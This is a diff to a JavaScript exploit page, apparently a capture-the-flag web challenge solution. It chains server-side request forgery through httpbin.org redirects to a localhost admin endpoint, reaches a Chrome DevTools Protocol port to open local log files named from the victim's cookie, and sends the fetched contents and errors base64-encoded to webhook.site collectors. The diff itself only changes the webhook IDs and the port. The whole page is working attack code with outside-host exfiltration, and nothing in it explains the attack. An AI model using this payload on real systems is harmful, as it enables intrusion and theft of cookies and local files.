@@ -39,17 +39,17 @@
                 let rsp = await fetch(prom, includeCookies ? { credentials: 'include' } : {});
                 let text = await rsp.text();
 
-                await fetch('https://webhook.site/1a8c08ae-3b83-4795-be29-8fba3587acdc?data=' + btoa(text), { mode: 'no-cors' });
+                await fetch('https://webhook.site/f0691a5b-9175-44dd-88fd-e3040c83d271?data=' + btoa(text), { mode: 'no-cors' });
                 return text;
             } catch (e) {
-                await fetch('https://webhook.site/1a8c08ae-3b83-4795-be29-8fba3587acdc?data=' + e, { mode: 'no-cors' });
+                await fetch('https://webhook.site/f0691a5b-9175-44dd-88fd-e3040c83d271?data=' + e, { mode: 'no-cors' });
             }
         }
 
         async function start() {
-            let rsp2 = await handleRsp('https://httpbin.org/redirect-to?url=' + encodeURIComponent('http://localhost:8080/admin/doHttpReq?method=PUT&url=' + encodeURIComponent('http://127.0.0.1:' + cdpPort + '/json/new?file:///app/logs/log-' + document.cookie.replace('user=', '') + '.htm')));
+            let rsp2 = await handleRsp('https://httpbin.org/redirect-to?url=' + encodeURIComponent('http://localhost:80/admin/doHttpReq?method=PUT&url=' + encodeURIComponent('http://127.0.0.1:' + cdpPort + '/json/new?file:///app/logs/log-' + document.cookie.replace('user=', '') + '.htm')));
             setTimeout(async () => {
-                let rsp3 = await handleRsp('https://httpbin.org/redirect-to?url=' + encodeURIComponent('http://localhost:8080/admin/doHttpReq?url=' + encodeURIComponent('http://127.0.0.1:' + cdpPort + '/json/list')));
+                let rsp3 = await handleRsp('https://httpbin.org/redirect-to?url=' + encodeURIComponent('http://localhost:80/admin/doHttpReq?url=' + encodeURIComponent('http://127.0.0.1:' + cdpPort + '/json/list')));
                 console.log(rsp3);
             }, 5000);
             await fetch('https://httpbin.org/delay/6', { mode: 'no-cors' });
@@ -69,13 +69,13 @@
             downloadFileAndBlock(openPorts[0]);
         } else {
             console.log('none');
-            fetch('https://webhook.site/1a8c08ae-3b83-4795-be29-8fba3587acdc?data=none');
+            fetch('https://webhook.site/f0691a5b-9175-44dd-88fd-e3040c83d271?data=none');
         }
     });
 
     window.startFn();
 
     window.onbeforeunload = function () {
-        fetch('https://webhook.site/1a8c08ae-3b83-4795-be29-8fba3587acdc?data=unload');
+        fetch('https://webhook.site/f0691a5b-9175-44dd-88fd-e3040c83d271?data=unload');
     }
 </script>
